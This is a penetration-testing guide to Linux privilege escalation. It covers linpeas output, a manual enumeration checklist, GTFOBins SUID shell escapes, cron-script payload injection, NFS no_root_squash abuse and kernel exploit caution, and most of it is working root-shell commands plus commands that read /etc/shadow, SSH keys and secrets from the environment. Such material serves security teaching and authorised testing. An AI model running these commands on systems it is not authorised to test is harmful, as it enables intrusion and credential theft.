# Linux Privilege Escalation Enumeration Guide

## Introduction

Linux privilege escalation begins with systematic enumeration. The goal is to identify every misconfiguration, every over-permissioned binary, and every architectural weakness that could allow a low-privileged user to reach root. This guide covers interpreting automated enumeration output, performing a manual enumeration checklist, and exploiting the most common escalation vectors on Linux systems: SUID binaries via GTFOBins, cron job abuse, NFS root squashing misconfigurations, and kernel exploit safety practices.

---

## 1. Interpreting linpeas Output

linpeas produces color-coded output that categorizes findings by severity and likelihood:

- **RED/YELLOW**: High-probability escalation vectors. These entries indicate known-exploitable conditions such as writable /etc/passwd, SUID binaries with known exploits, or sudo rules with NOPASSWD.
- **GREEN**: Informational findings that may support escalation indirectly (installed tools, environment variables).
- **BLUE**: General system information (kernel version, OS release, hostname).

Key sections to focus on:

```bash
# Run linpeas with output capture
./linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out

# Extract high-priority findings
grep -E "\[+|\[!|\[*)" /tmp/linpeas.out | head -100
```

Common linpeas findings and their meanings:

| linpeas Finding | Meaning | Action |
|-----------------|---------|--------|
| `SUID binary: /usr/bin/find` | find has SUID bit set | Check GTFOBins for `find` SUID shell escape |
| `Writable /etc/passwd` | Password file is world-writable | Add root user or overwrite root password hash |
| `sudo: (root) NOPASSWD: /usr/bin/vim` | vim can be run as root without password | Use GTFOBins vim sudo shell escape |
| `cron: /etc/cron.d/backup.sh is writable` | Cron script running as root is writable | Append payload to the cron script |
| `cap_setuid+ep on /usr/bin/python3` | Python3 has setuid capability | Execute `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |

Always cross-reference linpeas findings with manual verification. linpeas may flag binaries that appear exploitable but are hardened or patched on the specific target.

---

## 2. Manual Enumeration Checklist

When automated tools are unavailable or stealth is required, perform manual enumeration in this order:

```bash
# Step 1: System identification
uname -r                    # Kernel version
cat /etc/os-release         # Distribution
id                          # Current user context
whoami                      # Username confirmation

# Step 2: SUID binary search
find / -perm -4000 -type f 2>/dev/null

# Step 3: sudo permissions
sudo -l                     # List sudo rules

# Step 4: Capabilities
getcap -r / 2>/dev/null

# Step 5: Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l

# Step 6: Writable files and directories
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys"

# Step 7: World-readable sensitive files
cat /etc/shadow 2>/dev/null
cat /root/.bash_history 2>/dev/null
find / -name "*.pem" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Step 8: Running processes and services
ps aux
ss -tlnp                    # Listening ports

# Step 9: NFS exports
cat /etc/exports 2>/dev/null

# Step 10: Environment variables and PATH
env | grep -iE "pass|key|token|secret"
echo $PATH
```

---

## 3. SUID Binary and GTFOBins Exploitation

After identifying SUID binaries, check each one against GTFOBins:

```bash
# Discover SUID binaries
find / -perm -4000 -type f 2>/dev/null

# For each result, search https://gtfobins.github.io
# Example: if /usr/bin/find has SUID
find . -exec /bin/sh -p \;

# Example: if /usr/bin/vim has SUID
vim -c ':!/bin/sh'

# Example: if /usr/bin/python3 has SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

GTFOBins categorizes exploitation by function (shell, file read, file write, sudo, SUID, capabilities). Always match the exploitation method to the specific privilege context. SUID exploits use the `-p` flag to preserve the elevated effective UID.

---

## 4. Cron Job Abuse

Cron jobs running as root with writable scripts are a reliable escalation vector:

```bash
# Enumerate cron jobs and check writability
find /etc/cron* -writable 2>/dev/null

# If a cron script is writable, inject a payload
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/cron.d/writable_script.sh

# Use pspy to discover hidden cron jobs not visible in /etc/crontab
./pspy64 -pf -i 1000
```

Watch for PATH hijacking in cron: if `/etc/crontab` defines a PATH that includes writable directories, place a malicious binary with the same name as the cron target in the writable directory.

---

## 5. NFS Root Squashing

NFS exports with `no_root_squash` allow root on one machine to write files as root on the NFS share:

```bash
# On target, check for vulnerable exports
cat /etc/exports | grep -i "no_root_squash"

# On attacker machine, mount the share
mkdir -p /mnt/nfs && mount -t nfs target:/share /mnt/nfs

# Create SUID binary as root on attacker
cp /bin/bash /mnt/nfs/rootbash
chmod u+s /mnt/nfs/rootbash

# On target, execute
/mnt/nfs/rootbash -p
```

---

## 6. Kernel Exploit Safety

Always treat kernel exploits as a last resort. Before executing any kernel exploit:

1. Verify the exact kernel version matches the exploit's supported range
2. Check architecture compatibility (x86_64, ARM64)
3. Look for reliability ratings in linux-exploit-suggester output
4. If possible, test in an identical environment first
5. Ensure a recovery path exists (system reboot, backup access)
6. Document the justification for why safer escalation vectors were insufficient

```bash
# Identify and evaluate kernel exploits
uname -r
./linux-exploit-suggester.sh
```

---

## References

- GTFOBins -- https://gtfobins.github.io
- HackTricks Linux Privilege Escalation -- https://book.hacktricks.wiki/linux-hardening/privilege-escalation
- linpeas Repository -- https://github.com/carlospolop/PEASS-ng
- PayloadsAllTheThings -- https://github.com/swisskyrepo/PayloadsAllTheThings
- linux-exploit-suggester -- https://github.com/mzet-/linux-exploit-suggester
- MITRE ATT&CK T1548 -- https://attack.mitre.org/techniques/T1548/
